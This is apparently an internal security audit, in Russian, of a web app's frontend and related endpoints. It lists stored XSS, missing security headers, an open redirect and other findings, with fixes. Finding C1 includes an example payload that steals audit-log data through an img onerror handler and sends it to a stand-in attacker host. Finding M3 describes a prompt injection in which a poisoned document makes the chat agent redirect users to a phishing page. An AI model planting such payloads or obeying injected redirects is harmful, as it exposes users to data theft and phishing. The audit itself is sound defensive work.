# NEW-1: Security deep-dive (фронт Act Constructor)

> Аудит фронтенда (`static/js/**`, `templates/**`) + проверка соответствующих
> backend-endpoint'ов. Цель — выявить реальные XSS / CSRF / privilege /
> sensitive-data риски, исключив false-positive путём ручной трассировки
> data-flow от source (юзер/БД/LLM) до sink (DOM / fetch / navigation).
>
> Контекст деплоя: PostgreSQL (dev) / Greenplum + JupyterHub Datalab (prod)
> с per-user процессом приложения за `/user/{user}/proxy/{port}/`,
> auth через ENV-переменную `JUPYTERHUB_USER` (stateless).

## Сводка

- **CRITICAL: 2**
- **HIGH: 3**
- **MEDIUM: 4**
- **LOW: 3**
- **INFO: 2**

### TL;DR (CRITICAL / HIGH одной строкой)

| # | Severity | Заголовок |
|---|---|---|
| C1 | CRITICAL | Stored XSS через `textBlock.content`: бэк не санитизирует HTML, фронт делает `editor.innerHTML = textBlock.content` |
| C2 | CRITICAL | Stored XSS в preview-режиме: `preview-violation-renderer.js::_addLine` ставит сырой текст в innerHTML |
| H1 | HIGH | Stored XSS в diff-режиме версий: `DiffRenderer._renderDiffTextBlock` ставит `tbDiff.{new,old,}Content` в innerHTML без санитизации |
| H2 | HIGH | Отсутствуют security headers (CSP / X-Frame-Options / HSTS / X-Content-Type-Options) на HTML/JSON-ответах |
| H3 | HIGH | Preview-рендер textblock (`preview-textblock-renderer.js:41`): `content.innerHTML = textBlock.content` без санитизации (тот же data-flow что C1) |

---

## §A. XSS-аудит

### A.1 Карта contentEditable-зон

Найдено три активных `contentEditable='true'`-зоны (узлы, в которые юзер вводит HTML через браузер):

| Файл:строка | Назначение | Источник contentEditable |
|---|---|---|
| `static/js/constructor/textblock/textblock-editor.js:37` | Редактор текстового блока в дереве акта | `editor.contentEditable = 'true'` |
| `static/js/constructor/textblock/textblock-links-footnotes.js:227` | Inline-редактирование ссылок/сносок | временное при кликe |
| `static/js/constructor/items/items-title-editing.js:43` | Inline-редактирование названия узла | временное при кликe |

Остальные `contentEditable` в кодовой базе — это **выключение** (`= 'false'`) для read-only / на init.

**Paste-handler анализ:**

- `textblock-editor.js:136-148::handleEditorPaste` — `e.preventDefault()` + `clipboardData.getData('text/plain')` + `execCommand('insertText', ...)`. **Безопасно**: только plain-text вставляется.
- `violation-paste.js:27-146::setupPasteHandler` — берёт **только** `text/plain` или `image` (через `getAsFile()` + `FileReader.readAsDataURL`). HTML из буфера не используется. **Безопасно.**
- `items-title-editing.js` — paste не перехватывается, но `contentEditable` снимается через `blur` и значение читается через `textContent` (не `innerHTML`). **Безопасно**, проверено по факту использования (см. §A.2 ниже — отсутствие innerHTML-sink для items-title).

Вывод по contentEditable-зоне: **XSS не через paste**, а через данные, которые уже сохранены в БД (см. C1).

### A.2 innerHTML usage — карта sink'ов

Все 60+ `innerHTML`-вызовов классифицированы:

| Категория | Кол-во | Пример | Риск |
|---|---|---|---|
| Очистка (`.innerHTML = ''`) | 25 | `static/js/constructor/items/items-renderer.js:17` | нет |
| Статичная строка из кода (loading / empty-state / SVG-иконки) | 22 | `static/js/portal/acts-manager/dialog-audit-log.js:199` | нет |
| Шаблон с `escapeHtml` на всех вставках | 7 | `static/js/portal/acts-manager/team-member-search.js:133-145` | нет |
| Шаблон БЕЗ `escapeHtml` на user-data | 4 | см. C1, C2, H1, H3 | **XSS** |
| Утилита `escapeHtml` (innerHTML на DOM-узле для escape) | 5 | `_escapeHtml(str) { div.textContent = str; return div.innerHTML }` — паттерн escape | нет |
| `chat-renderer._safeSetHtml` (DOMPurify) | ~9 | `static/js/shared/chat/chat-renderer.js:25-42` | нет |

#### A.2.1 ChatRenderer — корректно санитизирован

`static/js/shared/chat/chat-renderer.js:25-42::_safeSetHtml` оборачивает все markdown-output'ы через `DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })`. Все вызовы из `_renderText` (412), `_renderReasoning` (475), стриминг-блоков (338-359) идут через `_safeSetHtml`. **Безопасно.** Регрессионный grep: `Grep -n "_safeSetHtml\|\.innerHTML\s*=" static/js/shared/chat` показал только статичные SVG-константы (lines 558, 567, 812, 818) — `chat-messages.js` аналогично.

DOMPurify-fallback: при отсутствии vendor-скрипта `_safeSetHtml` пишет warn и ставит html as-is (line 41). Это dev-only fallback и DOMPurify в `templates/portal/base_portal.html:52` и `templates/constructor/base_constructor.html:59` подключён. **OK**, но см. M3.

### A.3 [CRITICAL C1] Stored XSS через TextBlock content (load-bearing)

**Файл:** `static/js/constructor/textblock/textblock-editor.js:27`

```js
createEditor(textBlock) {
    const editor = document.createElement('div');
    editor.className = 'textblock-editor';
    editor.dataset.textBlockId = textBlock.id;
    editor.dataset.placeholder = 'Введите текст...';
    editor.innerHTML = textBlock.content || '';   // ← НЕТ санитизации
    ...
    if (...) {
        editor.contentEditable = 'true';
        this.attachEditorEvents(editor, textBlock);
    }
    ...
}
```

**Подтверждение data-flow:**
1. `textBlock.content` приходит из API `GET /api/v1/acts/{act_id}/content` → `ActContentService.get_content` (см. `app/domains/acts/api/content.py:24-37`).
2. На бэке `TextBlockSchema.content` — обычный `str` без HTML-санитизации (`app/domains/acts/schemas/act_content.py:180`):
   ```python
   content: str = Field(default="", description="HTML-содержимое")
   ```
3. Сохраняется через `PUT /api/v1/acts/{act_id}/content` — никакой HTML-фильтрации в pipeline `ActContentService.save_content` (проверено grep'ом `sanitize|bleach|html.escape` по `app/domains/acts/` — **0 совпадений**).

**Attack scenario:**

1. Аудитор-инсайдер с доступом «Цифровой акт» (дефолтная роль, см. `app/api/v1/deps/role_deps.py:26`) открывает любой акт.
2. Через DevTools (или прямой POST в API) сохраняет в textblock контент:
   ```html
   <img src=x onerror="
       fetch('/api/v1/admin/audit-log').then(r=>r.json()).then(d=>
         fetch('//attacker.controlled/leak?data=' + btoa(JSON.stringify(d)))
       )
   ">
   ```
3. PUT уходит без валидации, БД хранит payload в `textBlock.content`.
4. Когда другой аудитор / админ открывает тот же акт → `editor.innerHTML = payload` → `<img onerror>` срабатывает в контексте сессии жертвы.
5. **Внутри JupyterHub-домена** атакующий получает доступ ко всем cookie/storage origin'а, может дёрнуть admin-API от имени жертвы (если жертва — админ), украсть Kerberos-зависимые ресурсы.

**Почему `contentEditable=true` не защищает:** `<script>` действительно не исполнится при `innerHTML` в contentEditable-контейнере, но `onerror`/`onclick`/`<iframe srcdoc>` срабатывают.

**Почему AppError-handler не помогает:** обработка ошибок касается серверных ошибок; HTML-payload пройдёт через `ActDataSchema` без модификации.

**Effort:** M / 4-8 часов / 1 dev.
**Fix direction:** 
- **Краткосрочно (фронт):** обернуть `editor.innerHTML = DOMPurify.sanitize(textBlock.content || '', { USE_PROFILES: { html: true } })`. Также в `preview-textblock-renderer.js:41`, `diff-renderer.js:198/200/209/211`, `dialog-help.js:169` (всё, что вытаскивает HTML из БД).
- **Долгосрочно (бэк):** добавить серверную санитизацию через `bleach` или аналог в `ActContentService.save_content`, whitelist тэгов `[p, br, b, strong, i, em, u, span, a, ul, ol, li, h1-h6]` + атрибутов `[href, class, style*]` (без `on*`, `srcdoc`, `formaction`, `src` для не-img).
- **Defense in depth:** включить CSP `default-src 'self'; script-src 'self' 'unsafe-inline'` (см. H2). После санитизации можно убрать `unsafe-inline` и `unsafe-eval`.

**Cross-links:** C2, H1, H3 — тот же класс баги по разным sink'ам.

### A.4 [CRITICAL C2] Stored XSS в preview через violation-fields

**Файл:** `static/js/constructor/preview/preview-violation-renderer.js:177-185`

```js
static _addLine(container, label, text, maxLength = null) {
    const trimLength = maxLength ?? AppConfig.preview.defaultTrimLength;
    const line = document.createElement('div');
    line.className = 'preview-violation-line';
    line.innerHTML = `${label}: ${this._trim(text, trimLength)}`;   // ← НЕТ escape
    container.appendChild(line);
}
```

**Подтверждение data-flow:**
- `_trim(text, ...)` — `static/js/constructor/preview/preview-violation-renderer.js:194-198`: возвращает `text.slice(...)` без экранирования.
- Вызывающие места (line 44-168):
  - `violation.violated` (поле «Нарушено»)
  - `violation.established` (поле «Установлено»)
  - `violation[fieldName].content` для опциональных полей (reasons, consequences, responsible, recommendations)
  - `text` для freeText/case-items
- Все эти поля редактируются юзером через `<textarea>` в `violation-core.js` и хранятся в БД как `str` (`ViolationFieldSchema.content`, `app/domains/acts/schemas/act_content.py:201`, `219`).

**Особенность violation против C1:** редактирование идёт через `<textarea>` → `textarea.value` (XSS-safe), но **preview-режим** ставит то же содержимое через `innerHTML`. Если юзер запишет `<img src=x onerror=...>` в textarea — сохранится буквально, в preview-сценарии исполнится.

**Attack scenario:** идентичен C1. Аудитор пишет в поле «Нарушено» payload → коллега открывает preview-панель (`PreviewManager.update()` дёргается на каждом keystroke) → XSS.

**Особо плохо:** preview-панель открыта **по умолчанию** в режиме предпросмотра и обновляется debounced при каждом редактировании. Атакующему даже не нужно ждать ручной активации — достаточно чтобы жертва открыла акт.

**Effort:** S / 1-2 часа / 1 dev.
**Fix direction:** заменить на `line.textContent = ...` (label статичен, text — единственный динамический), либо escape:
```js
const safeText = this._escapeHtml(this._trim(text, trimLength));
line.innerHTML = `${label}: ${safeText}`;
// или лучше:
line.appendChild(document.createTextNode(`${label}: ${this._trim(text, trimLength)}`));
```

**Cross-links:** C1, H1, H3.

### A.5 [HIGH H1] Stored XSS в diff-режиме версий

**Файл:** `static/js/portal/acts-manager/diff-renderer.js:193-215`

```js
static _renderDiffTextBlock(container, tbDiff) {
    const div = document.createElement('div');
    div.className = `diff-textblock diff-${tbDiff.status}`;

    if (tbDiff.status === 'added') {
        div.innerHTML = tbDiff.newContent || '';        // ← NEW: NO sanitization
    } else if (tbDiff.status === 'removed') {
        div.innerHTML = tbDiff.oldContent || '';        // ← OLD: NO sanitization
    } else if (tbDiff.status === 'modified' && tbDiff.wordDiff) {
        div.className += ' diff-text';
        const html = tbDiff.wordDiff.map(part => {
            const escaped = this._escapeHtml(part.text);   // ← only modified-mode escapes
            ...
        }).join(' ');
        div.innerHTML = html;
    } else {
        div.innerHTML = tbDiff.content || tbDiff.newContent || '';   // ← fallback: NO escape
    }
    ...
}
```

**Подтверждение data-flow:** `tbDiff.newContent`/`oldContent` — содержимое исторических версий из API `GET /api/v1/acts/{act_id}/versions/{version_id}` (`app/domains/acts/api/audit_log.py`). Идентично C1 — тот же `TextBlockSchema.content` без санитизации.

**Attack scenario:**
1. Аудитор A создаёт версию с textblock-payload `<img src=x onerror=fetch(...)>`.
2. Аудитор B открывает «Журнал изменений» → «Просмотр версии» → переключается на режим diff.
3. `DiffRenderer.render()` дёргается → `_renderDiffTextBlock` → XSS у B.

**Уточнение:** modified-режим использует `_escapeHtml` (line 205), значит при сравнении двух версий с одинаковым textblock-id уязвимость нивелируется. Но `added`/`removed`/`fallback` ветки — нет, и именно они срабатывают при первой же добавленной/удалённой версии.

**Effort:** S / 1-2 часа / 1 dev.
**Fix direction:** обернуть все `div.innerHTML = ...Content` через `DOMPurify.sanitize(...)`. DOMPurify уже загружен на странице (см. `base_portal.html`). После фикса C1 (серверная санитизация) — diff также будет безопасен автоматически.

**Cross-links:** C1, C2, H3.

### A.6 [HIGH H3] Preview-textblock = тот же data-flow что C1

**Файл:** `static/js/constructor/preview/preview-textblock-renderer.js:36-44`

```js
static _createContent(textBlock) {
    const content = document.createElement('div');
    content.className = 'preview-textblock-content';

    this._applyFormatting(content, textBlock.formatting);
    content.innerHTML = textBlock.content;   // ← без санитизации
    ...
}
```

Преимущественно дублирует C1 (тот же `textBlock.content`), но **другой sink** — preview-панель в правой части конструктора. Открыта по умолчанию для всех ролей, не требует переключения режима. **Триггер срабатывает раньше C1** (preview обновляется по дебаунсу 500ms после ввода — см. `textblock-editor.js:119-130::handleEditorInput`).

**Effort/Fix:** S, идентично C1 — DOMPurify-обёртка.

### A.7 [MEDIUM M1] Username без escape в audit-log

**Файл:** `static/js/portal/acts-manager/dialog-audit-log.js:411-420, 495-515`

```js
return `
    <div class="audit-log-entry">
        <div class="audit-log-entry-header">
            <span class="audit-log-entry-action">${action}</span>
            <span class="audit-log-entry-meta">${entry.username} &mdash; ${date}</span>
            ...
```

`entry.username` — НЕ обёрнут в `_escapeHtml` (хотя другие поля в этом же файле — обёрнуты, см. line 442). Аналогично line 503 `v.username`. Сейчас username = табельный номер (только цифры, см. `extract_username_digits` в `app/api/v1/endpoints/auth.py:26-56`, валидация `\D` → digits 5-20), но это inconsistency и регрессия при изменении формата (например, если в будущем добавятся буквы для внешних пользователей).

**Severity MEDIUM** — текущий формат username безопасен, но code smell + регрессионный риск.

**Effort:** XS / 15 мин.
**Fix:** обернуть в `_escapeHtml(entry.username)`.

### A.8 [MEDIUM M2] Unquoted data-attribute в admin-add-user-dialog

**Файл:** `static/js/portal/admin/admin-add-user-dialog.js:118-126`

```js
resultsEl.innerHTML = users.map(u => `
    <div class="admin-add-result-item" data-username="${u.username}">     // ← без escape
        <div class="admin-add-result-name">${this._escapeHtml(u.fullname || u.username)}</div>
        ...
```

Тело экранируется, но **атрибут** `data-username="${u.username}"` — нет. `u.username` приходит из `APIClient.searchUsers(query)` → `/api/v1/admin/users/search` → подключение к user-directory (внешний AD/каталог).

**Attack scenario:** при компрометации user-directory можно вернуть username вида `"><img src=x onerror=...>`. Cookie-стиль атрибутной XSS.

**Severity MEDIUM** — зависит от того, насколько user-directory доверенный source. На уровне корпоративного AD — маловероятно, но защита тривиальна.

**Effort:** XS / 10 мин.
**Fix:** `data-username="${this._escapeHtml(u.username)}"`.

### A.9 Jinja2 `| safe`

Единственный `| safe` в шаблонах:

| Файл:строка | Контекст |
|---|---|
| `templates/portal/layout/sidebar.html:48` | `{{ item.icon_svg|safe }}` — статичный SVG из `app/domains/<domain>/__init__.py` (зашит в код) |

**Безопасно.** `icon_svg` объявлен как `str` в `app/core/domain.py:36` и заполняется в каждом домене **только литералами**. Регрессионный риск низкий, но при добавлении user-controlled SVG-стрелки/иконки — следить.

---

## §B. CSRF / SSRF

### B.1 CSRF — особенность auth-модели

CSRF-токены **не используются и не требуются**. Обоснование:

- Auth полностью stateless, username читается из process-level ENV `JUPYTERHUB_USER` (см. `app/api/v1/endpoints/auth.py:73`, `app/api/v1/deps/auth_deps.py:17-33`).
- ENV-переменная устанавливается JupyterHub'ом при spawn процесса пользователя. **Cross-origin запрос не несёт ENV** — атакующий не может «выполнить запрос от имени» через CSRF в классическом смысле.
- Cookies/sessions не используются (`document.cookie` — 0 совпадений в `static/js`).

**Однако:** в JupyterHub-деплое два разных приложения юзера живут на одном origin (`/user/{user}/proxy/{port_a}/` и `.../proxy/{port_b}/`). Если есть второе приложение с XSS — оно может дёрнуть Act Constructor API на тот же ENV-username, потому что fetch к same-origin несёт его автоматически (хоть и без cookie). Это **не CSRF в строгом смысле**, а privilege-escalation через scope sharing внутри Jupyter-сессии. Митигируется тем что JupyterHub юзер сам контролирует свои подпроцессы.

### B.2 X-JupyterHub-User header — quasi-dead code (LOW)

**Файл:** `static/js/shared/auth.js:262-267`

```js
static getAuthHeaders() {
    const username = this.getCurrentUser();
    return {
        'X-JupyterHub-User': username || ''
    };
}
```

Header добавляется в каждый API-call (`api.js:312`, `chat-renderer.js:849`, ...), но на бэке **игнорируется**:
- `get_username()` deps читает только ENV (`app/api/v1/deps/auth_deps.py:27`).
- Единственная точка использования header'а на бэке — `app/routes/portal.py:39-41` (landing page, render nav menu).

**Anti-pattern:**
1. Создаёт ложное впечатление, что header «авторизует» (на самом деле — нет).
2. Может ввести нового разработчика в заблуждение → security middleware на основе header'а.
3. Logs/proxies могут начать логировать header → утечка username в access-логи.

**Severity LOW.**
**Effort:** S / 1-2 часа.
**Fix direction:** **либо** убрать header полностью (бэк его не использует), **либо** добавить middleware, который читает `JUPYTERHUB_USER` из header и сверяет с ENV — но это не нужно для текущей модели. Рекомендую удалить.

### B.3 SSRF (server-side)

На фронте SSRF не применим (browser-context). Серверные SSRF-вектора (внешний LLM/agent endpoint URL'ы) — вне scope этого аудита.

---

## §C. Auth / privilege escalation

### C.1 Заголовок X-JupyterHub-User → landing render (LOW)

**Файл:** `app/routes/portal.py:39-43`

```python
header_user = request.headers.get("x-jupyterhub-user")
if header_user:
    username = extract_username_digits(header_user)
else:
    username = get_current_user_from_env()
```

Landing-страница принимает username **из header**, если тот есть. На landing влияние ограничено — рендер nav-menu (показать/скрыть пункты по ролям). Реальный API-доступ всё равно через `get_username()` → ENV.

**Attack scenario:** юзер X шлёт запрос к своему landing с header `X-JupyterHub-User: 11111111` (чужой табельный). Видит nav-menu **админа** (если 11111111 — админ). Не получает доступ к admin-API (там ENV). **Information disclosure**: чужой роль-набор.

**Severity LOW.**
**Effort:** XS / 5 мин.
**Fix:** убрать header-чтение в `portal.py:39-41`, всегда использовать ENV.

### C.2 Read-side доступ к ролям юзера — нет endpoint enumeration

Проверены `app/domains/admin/api/roles.py`: все мутирующие/чтение чужих ролей защищены `dependencies=[_admin]` (`require_admin()` → `app/api/v1/deps/role_deps.py:192-197`). `/my-roles` (`app/api/v1/endpoints/roles.py:16`) — только свои. **OK.**

### C.3 Client-side role checks — не load-bearing

Grep `is_admin\|hasRole\|requireRole` по фронту: `is_admin` приходит из Jinja-template (`app/routes/portal.py:48`) — но это только для render nav. Реальные ограничения — на бэке (`require_domain_access` / `require_admin`). **OK.**

### C.4 LocalStorage `auth_username` — INFO

**Файл:** `static/js/shared/auth.js:13`

```js
static _storageKey = 'auth_username';
```

Хранится 24h. Если на том же origin есть XSS — можно прочитать. Но username = табельный номер (PII-low), не токен.

**Severity INFO.**

---

## §D. Sensitive data exposure

### D.1 localStorage

| Ключ | Содержимое | Чувствительность |
|---|---|---|
| `auth_username` | Табельный номер (digits) | INFO |
| `auth_timestamp` | timestamp | нет |
| `app_settings` | UI prefs | нет |
| `chat-history-collapsed`, `portal-sidebar-collapsed` и пр. | UI state | нет |
| `acts-menu-cache` (`static/js/constructor/header/acts-menu.js:75`) | **Список актов юзера (KM-номера, titles, метаданные)** | LOW |
| Constructor state (`AppConfig.localStorage.stateKey`) | **Полное содержимое акта, включая текст нарушений** | MEDIUM |

`storage-manager.js` сохраняет полное состояние акта в localStorage для recovery (см. dual-tracking pattern в CLAUDE.md). Содержит текст нарушений, метрики, всё. **Severity LOW** — если устройство юзера компрометировано, всё равно скомпрометировано всё; но если на origin есть другое JupyterHub-приложение с XSS — можно вытащить.

**Mitigation:** не критично для текущей модели угроз (закрытая сеть, контролируемые рабочие места), но имеет смысл документировать.

### D.2 sessionStorage

| Ключ | Содержимое |
|---|---|
| `chat:executedActions` | список UUID-ов исполненных client-action блоков |
| `chat_collapsed`, `sessionExitedWithSave` | UI state |

**Безопасно.**

### D.3 console.log с username

`auth.js:164, 197` логируют username в console. Табельный номер — не секрет, но dev-окружение. **INFO.**

### D.4 URL query-параметры

- `/constructor?act_id={int}` — act_id не PII.
- `/error/401?reason=kerberos` — reason не sensitive.

**OK.**

### D.5 Cookies

`document.cookie` — 0 совпадений в `static/js`. Приложение **не использует cookies**. **OK.**

---

## §E. Dead / unprotected endpoints

Сопоставление backend `@router.<method>` с фронтенд-вызовами.

| Endpoint | Auth required | Role check | Used from frontend? | Notes |
|---|---|---|---|---|
| `GET /api/v1/auth/me` | нет (читает ENV) | нет | `auth.js:134` | OK — design |
| `GET /api/v1/auth/validate` | 401 если нет | нет | НЕ ИСПОЛЬЗУЕТСЯ | LOW: dead endpoint |
| `GET /api/v1/my-roles` | да | нет | проверки нет в grep'е | LOW: возможно dead |
| `GET /api/v1/admin/roles` | `_admin` | да | `admin-roles.js` | OK |
| `GET /api/v1/admin/users/directory` | `_admin` | да | да | OK |
| `GET /api/v1/admin/users/search` | `_admin` | да | да | OK |
| `POST /api/v1/admin/users/{username}/roles` | `_admin` | да | да | OK |
| `DELETE /api/v1/admin/users/{username}/roles/{role_id}` | `_admin` | да | да | OK |
| `GET /api/v1/admin/audit-log` | `_admin` | да | да | OK |
| `GET /api/v1/admin/diagnostics` | (см. `admin_diagnostics.py`) | да | да | OK |
| `GET /api/v1/acts/list` | да | (per-act access check) | да | OK |
| `POST/PATCH/DELETE /api/v1/acts/{id}/...` | да | `ActAccessRepository.check_user_access` | да | OK |
| `GET /api/v1/acts/{id}/content` | да | да | `api.js:311 (loadActContent)`, `api.js:835 (loadActContentRaw)` | OK |
| `PUT /api/v1/acts/{id}/content` | да | да | да | **уязвим к stored XSS — см. C1** |
| `POST /api/v1/acts/save-act` | да | косвенно (через act_id) | да | OK |
| `GET /api/v1/acts/export/download/{filename}` | да | через `storage.get_act_id_for_file` → access check | да | **OK** (защита от path traversal через `validate_filename` + `get_file_path`) |
| `GET /api/v1/chat/files/{file_id}` | да | да + `nosniff + octet-stream` | да | OK (правильно реализовано) |
| `GET /api/v1/chat/limits` | да | да | да | OK |
| `GET /api/v1/health`, `/health/detailed`, `/version` | нет | нет | нет | INFO: публичные health-checks. На JupyterHub-proxy всё равно недоступны извне |
| `GET /api/v1/health/detailed/full` | да (401) | нет | нет | OK |

**Подытог:**
- `loadActContentRaw` (`api.js:833`) ДЕЙСТВУЕТ — используется в `version-preview.js:127` для diff. Не dead.
- `checkReadOnlyMode` (`api.js:819`) ДЕЙСТВУЕТ — служебная функция, не endpoint.
- `auth/validate` — реально не используется фронтом, но безвредна.

---

## §F. File upload / download

### F.1 Chat file upload

- Backend схема через `FileService.validate_file` (см. dev-guide §11) — mime/size/total ограничения серверные.
- Frontend (`chat-files.js`) — дублирует валидацию из endpoint `/api/v1/chat/limits` (line 81-100).
- **Path traversal:** filename из upload юзера НЕ используется как путь на диске — `FileService` сохраняет под собственным `file_id` (uuid), оригинал — только метаданные. Проверено по `app/domains/chat/api/files.py:45-68` (только `file_id` в URL).
- **Download response:** правильно — `application/octet-stream + nosniff + Content-Disposition` (`files.py:59-68`). HTML/SVG/script-файлы не отрендерятся в браузере, скачаются. **Excellent.**

**Severity OK.**

### F.2 Acts file download

`/api/v1/acts/export/download/{filename}` — см. `app/domains/acts/api/export.py:165-260`:
- `storage.validate_filename(filename)` — отдельная валидация.
- `storage.get_file_path(filename)` — возвращает None для unsafe.
- `ActAccessRepository.check_user_access(act_id, username)` — проверка доступа.
- Семафор + audit-log.

**Защита от path traversal реализована корректно.**

**Frontend:**
- `api.js:256-277::downloadFile(filename)` — filename подставляется в URL. Браузер сделает URL-encoding для path-сегмента (если есть `/` или `..`). Bcкnд получит как path-param и валидирует. **OK.**

### F.3 Inline preview chat-files

`chat-renderer.js:830-873` рендерит preview по MIME:
- image → `<img src>` (только octet-stream от бэка → не отрендерится как HTML, но как img → возможно)
- pdf → `<iframe src>`
- text → fetch + `pre.textContent`
- остальное → unsupported sign

`mime` приходит **из БД** (метаданные сообщения). Атакующий может загрузить SVG с onload-payload и проставить `mime='image/svg+xml'` в БД через прямой INSERT (если есть доступ к БД). Однако бэк всегда отдаёт `application/octet-stream + nosniff` → браузер **не** отрендерит как SVG, скачает как файл. **Защита бэка нивелирует фронтенд-trust.**

**Severity OK.**

### F.4 Restore версии

`/api/v1/acts/{id}/versions/{vid}/restore` — endpoint вернёт content, который запишется как новый snapshot. Если в исторической версии payload (C1), restore его сохранит и продолжит распространение. **Cross-link C1.**

---

## §G. Iframe / postMessage / WebSocket / SSE

### G.1 iframe

Единственный — `chat-renderer.js:837-840`:
```js
const iframe = document.createElement('iframe');
iframe.src = inlineUrl;
```
`inlineUrl` — собственный backend-URL (`/api/v1/chat/files/{file_id}?inline=true`). Бэк всегда отдаёт `octet-stream + nosniff` → iframe не отрендерит как HTML. **OK.**

### G.2 postMessage

`postMessage` — **0 совпадений** в `static/js`. **OK.**

### G.3 WebSocket

`WebSocket` — **0 совпадений** в `static/js`. **OK.**

### G.4 SSE

`text/event-stream` — два места в `chat-stream.js`:
- `:84` — POST /messages (короткий, `agent_request_started`)
- `:310` — Resume SSE (`/forward-stream/{rid}`)

Используется `fetch(..., { headers: { Accept: 'text/event-stream' } })` (не `EventSource` — позволяет custom headers). **`EventSource` НЕ используется**, что хорошо: `EventSource` шлёт credentials автоматически без явной опции.

Парсинг SSE — built-in (`response.body.getReader()`), payload — JSON-блоки → `ChatRenderer.appendBlock` → `_safeSetHtml` (для text/code/reasoning). **OK.**

---

## §H. Third-party dependencies

### H.1 DOMPurify 3.4.2

`static/vendor/dompurify/purify.min.js:1` — `DOMPurify 3.4.2`. Актуальная версия (released 2024-12). Известных активных CVE на этой версии нет. **OK.**

### H.2 CDN

`grep` `script src="https?://` в templates — **0 совпадений**. Все скрипты локальные. **Excellent** — нет supply-chain риска через CDN.

---

## §I. Information leaks в ошибках

### I.1 Generic exception handler

`app/main.py:426-435`:
```python
@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception):
    logger.exception(f"Необработанное исключение: {request.url.path}")
    if _is_html_request(request):
        return _render_error_page(request, 500)
    return JSONResponse(
        status_code=500,
        content={"detail": "Внутренняя ошибка сервера"},   // ← БЕЗ stacktrace
    )
```

**Хорошо.** Stacktrace только в логах, юзер видит generic-сообщение.

### I.2 CheckViolationError handler

`app/main.py:405-417`: маппит CHECK-constraint имя на user-friendly сообщение из `CHECK_CONSTRAINT_MESSAGES`. Если маппинга нет — fallback `"Данные не прошли проверку ограничений базы данных"` (не показывает имя констрейнта). **OK.**

### I.3 UniqueViolationError handler

`app/main.py:396-403`: `"Запись с такими данными уже существует"`. Не показывает конкретный констрейнт/колонку. **OK.**

### I.4 Kerberos error handler

`app/main.py:356-387`: показывает текст инструкции (`kinit`), не stacktrace. **OK.**

---

## §J. Race conditions

### J.1 ActLockService TOCTOU

Backend-уровень, вне scope этого аудита. См. `acts.expired_locks_cleanup` + inactivity-watcher (CLAUDE.md).

### J.2 Concurrent saves (storage-manager)

Фронт делает debounce (3s) + periodic (2min) save (см. CLAUDE.md). При двух одновременных юзерах в одном акте срабатывает lock-механика на бэке (один владеет lock'ом, другой видит read-only). Race на фронте отсутствует — Proxy-based tracking + debounce.

### J.3 ChatStream resume race

Учтён через `_resumeAbortController` отдельно от `_abortController` (см. CLAUDE.md). **OK.**

---

## §K. Сводная карта рисков

| ID | Severity | Заголовок | Файл:строка | Effort | Cross-links |
|---|---|---|---|---|---|
| **C1** | CRITICAL | Stored XSS через `textBlock.content` в editor | `textblock-editor.js:27` | M | C2, H1, H3 |
| **C2** | CRITICAL | Stored XSS в preview через violation-fields | `preview-violation-renderer.js:183` | S | C1 |
| **H1** | HIGH | Stored XSS в diff-режиме версий | `diff-renderer.js:198,200,209,211` | S | C1 |
| **H2** | HIGH | Нет CSP / X-Frame-Options / HSTS / nosniff на HTML/JSON | `app/main.py`, `app/core/middleware.py` | M | C1, C2, H1, H3, M2 |
| **H3** | HIGH | Stored XSS в preview-textblock | `preview-textblock-renderer.js:41` | S | C1 |
| **M1** | MEDIUM | Username без escape в audit-log | `dialog-audit-log.js:415,503` | XS | — |
| **M2** | MEDIUM | Unquoted data-attribute в admin-add-user | `admin-add-user-dialog.js:119` | XS | A.8 |
| **M3** | MEDIUM | Open-redirect через `open_url` client-action | `chat-client-actions.js:142-158`, `app/core/chat/blocks.py:32-34` | S | — |
| **M4** | MEDIUM | Acts state в localStorage содержит полное содержимое акта | `storage-manager.js`, `acts-menu.js:75` | M | — |
| **L1** | LOW | `X-JupyterHub-User` header dead/misleading | `auth.js:262-267` | S | — |
| **L2** | LOW | `portal.py` landing принимает header вместо ENV (info-disclosure про чужие nav) | `app/routes/portal.py:39-43` | XS | — |
| **L3** | LOW | LocalStorage `auth_username` доступен XSS-вектору | `auth.js:13` | M | C1 |
| **I1** | INFO | console.log username в auth.js | `auth.js:164,197` | XS | — |
| **I2** | INFO | DOMPurify-fallback пишет non-sanitized если vendor отсутствует | `chat-renderer.js:33-41` | — | — |

### Подробности по M3 (open-redirect)

**Файл:** `static/js/shared/chat/chat-client-actions.js:124-128, 153-159`

```js
const ALLOWED_OPEN_URL_SCHEMES = ['http://', 'https://', 'mailto:', '/'];
function isAllowedUrl(url) {
    return ALLOWED_OPEN_URL_SCHEMES.some(s => url.startsWith(s));
}
...
ClientActionsRegistry.register('open_url', ({ url }) => {
    if (!isAllowedUrl(url)) {
        console.warn(`open_url: запрещённая схема URL: ...`);
        return;
    }
    window.location.href = resolveProxyUrl(url);   // ← любой https://evil.com проходит
});
```

Бэкенд имеет идентичный whitelist (`app/core/chat/blocks.py:32-34`). Проблема: `http://` и `https://` пускают любой external URL.

**Attack scenario (prompt-injection):**
1. Юзер задаёт LLM-агенту вопрос про внешнюю базу знаний.
2. Если в knowledge-base пишутся данные, контролируемые third-party (например, PDF с инъекцией), LLM может вернуть:
   ```json
   {"type": "client_action", "action": "open_url", "params": {"url": "https://phishing-clone.evil/login"}}
   ```
3. Юзер видит «открывается ссылка...» (если фронт показывает) или мгновенный redirect.

**Severity MEDIUM** — требует наличия инъекции в LLM-источнике; страница перенаправления видна юзеру.

**Effort:** S / 1-2 часа.
**Fix direction:** добавить allowlist доменов (или origin-only check) для http(s):
```js
const ALLOWED_EXTERNAL_HOSTS = new Set([
    // sbrf-домены, корпоративные ресурсы
    'confluence.sbrf.ru', ...
]);
function isAllowedUrl(url) {
    if (url.startsWith('/') || url.startsWith('mailto:')) return true;
    try {
        const u = new URL(url);
        if (u.protocol !== 'https:' && u.protocol !== 'http:') return false;
        return ALLOWED_EXTERNAL_HOSTS.has(u.host);
    } catch { return false; }
}
```
И симметрично на бэке (`app/core/chat/blocks.py`).

### Подробности по H2 (отсутствие security headers)

`app/core/middleware.py` содержит `HTTPSRedirectMiddleware`, `RequestSizeLimitMiddleware`, `RateLimitMiddleware`, `RequestIdMiddleware` — **никаких security-headers middleware**. На HTML/JSON-ответах:
- **Нет CSP** → любой XSS (C1, C2, H1, H3) усиливается до full script-exec без ограничений.
- **Нет X-Frame-Options / CSP frame-ancestors** → click-jacking возможен (хотя за JupyterHub-proxy это смягчено).
